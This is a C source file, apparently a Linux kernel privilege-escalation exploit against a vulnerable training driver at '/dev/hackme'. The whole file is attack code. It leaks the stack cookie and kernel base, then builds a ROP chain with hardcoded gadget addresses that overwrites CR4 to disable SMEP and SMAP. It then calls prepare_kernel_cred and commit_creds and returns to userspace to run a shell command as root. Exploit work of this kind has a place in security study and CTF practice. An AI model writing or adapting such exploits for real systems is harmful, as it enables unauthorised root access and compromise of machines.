// TECHNIQUE BASED ON 
// https://android.googlesource.com/kernel/mediatek/+/android-5.1.0_r0.2/arch/x86/kernel/relocate_kernel_64.S?autodive=0//////////////


#include <stdio.h>
#include <stdlib.h>

#include <fcntl.h>
#include <unistd.h>
#include <signal.h>
#include <sys/types.h>

#define DEVICE_PATH "/dev/hackme"
#define EXPLOIT_TAG "[...] "

#define ull unsigned long long
#define PTR_SZ (sizeof(ull))
#define LEAKAGE 32*PTR_SZ

#define SYM_OFFSET               0x000000000084e047ull
#define KBASE                    0xffffffff81000000ull
#define pop_rax_ret              0xffffffff81004d11ull
#define mov_rax_cr4_jmp          0xffffffff81006099ull               // RESTRICT: cr3<-r9 should be correct
#define extract_cr3              0xffffffff8146d492ull               // mov ebp, esp ; mov rax, cr3 ; pop rbp ; ret
#define xchg_r9_rax_call         0xffffffff81fc9904ull
#define xchg_r8_rax_ret          0xffffffff81b695b5ull
#define mov_r9_r8_ret_pop_rbp    0xffffffff816c6599ull
#define xor_rax_rax              0xffffffff81a69ca1ull                   ///: xor rax, rax ; ret
#define xor_r10_r10              0xffffffff818f6f4bull                  /// : xor r10d, r10d ; mov rax, r10 ; ret

const ull OFFSET_commit_creds = 0x4c6410ull;
const ull OFFSET_prepare_kernel_cred = 0x4c67f0ull;
ull user_ss, user_sp, user_rflags, user_cs; 

static int vd;
static ull cookie, kbase_calculated;

ull buf[LEAKAGE];

int hackme_read(char *buf, size_t n) {
    return read(vd, buf, n);
}

int hackmd_write(char *buf, size_t n) {
    return write(vd, buf, n);
}

void pretty_print(ull *buf, size_t n) {
    printf("- DUMP");
    for (int i = 0; i < n/2; i += 1) {
        printf("\t%p[%d] %p[%d]\n", buf[2*i], 2*i, buf[2*i+1], 2*i+1);
    }
}


void save_state(void) {
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "mov user_cs, cs;"

        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
}


void leak(void) {
        // Try to leak some info
        if (hackme_read((char *) &buf, LEAKAGE) != LEAKAGE) {
            printf(EXPLOIT_TAG "Failed to leak information: read less than %d\n", LEAKAGE);
            return 1;
        }

        // Leaks for defeating stack protector & kaslr
        cookie = buf[2];
        kbase_calculated = buf[10] - SYM_OFFSET;
}

void after_trampoline(void) {
    system("/usr/bin/id");
}
const ull ret_addr = (ull) &after_trampoline;


void trampoline(void) {
    __asm__(
        ".intel_syntax noprefix;"
        "mov rax, kbase_calculated;"
        "add rax, OFFSET_prepare_kernel_cred;"
        "xor rdi, rdi;"
        "call rax;"
        "mov rdi, rax;"
        "mov rax, kbase_calculated;"
        "add rax, OFFSET_commit_creds;"
        "call rax;"

        "swapgs;"

        "mov rax, user_ss;"
        "push rax;"

        "mov rax, user_sp;"
        "push rax;"

        "mov rax, user_rflags;"
        "push rax;"

        "mov rax, user_cs;"
        "push rax;"

        "mov rax, ret_addr;"
        "push rax;"
        "iretq;" 


        ".att_syntax;"
    );
}

int main(int argc, char **argv) {
    // Open the device
    vd = open(
        DEVICE_PATH,
        O_RDWR
    );

    if (vd < 0) {
        printf(EXPLOIT_TAG "Failed to open vulnerable device: %d\n", vd);
        return 1;
    }


    if (argc == 2) {
        save_state();

        printf(EXPLOIT_TAG "Saved state: [%p, %p, %p, %p] \n", user_ss, user_sp, user_rflags, user_cs);
        sleep(2);

        // Wait for parent to be killed
        printf(EXPLOIT_TAG "Parent might be killed because CR4 state is changed (-smap, -smep). Continuing to <%p>\n", trampoline);

        // Now return to userspace with disabled SMAP & SMEP
        leak();
        
        int idx = 16;
        buf[idx++] = cookie;
        buf[idx++] = 0x4141414141414148;  // RBX
        buf[idx++] = 0x4141414141414149;  // R12
        buf[idx++] = 0x414141414141414a;  // RBP
        buf[idx++] = (ull) &trampoline;

        hackmd_write((char *) &buf, idx *PTR_SZ);

    } else {
        leak();
        
        printf(EXPLOIT_TAG "Patching the cr4 & cr3 (ret2)\n");

        // For debugging purposes 
        printf(EXPLOIT_TAG "COOKIE=%p | KBASE=%p\n", cookie, kbase_calculated);
        pretty_print((void *) &buf, LEAKAGE/PTR_SZ);


        // Overwrite some shit    
        int idx = 16;
        buf[idx++] = cookie;
        buf[idx++] = 0x4141414141414148;  // RBX
        buf[idx++] = 0x4141414141414149;  // R12
        buf[idx++] = 0x414141414141414a;  // RBP

        // Extract real value of cr3 (it's impossible to brute it or gain real value using basic read primitive)

        buf[idx++] =  extract_cr3;        // cr3->rax 
        buf[idx++] = 0xdeaddead;          // RBP
        
        buf[idx++] = xchg_r8_rax_ret;
        buf[idx++] = 0xdeaddead;         // RBP

        // rax, r10 == 0!
        buf[idx++] = xor_rax_rax;
        buf[idx++] = xor_r10_r10;

        buf[idx++] = mov_r9_r8_ret_pop_rbp;
        buf[idx++] = 0xdeaddead;         // RBP

        buf[idx++] = pop_rax_ret;
        buf[idx++] = 0x06f0ull;          // FAKED CR4

        buf[idx++] = mov_rax_cr4_jmp;

        system("/exploit pwn &");
        hackmd_write((char *) &buf, idx *PTR_SZ);
    }


    return 0;
}

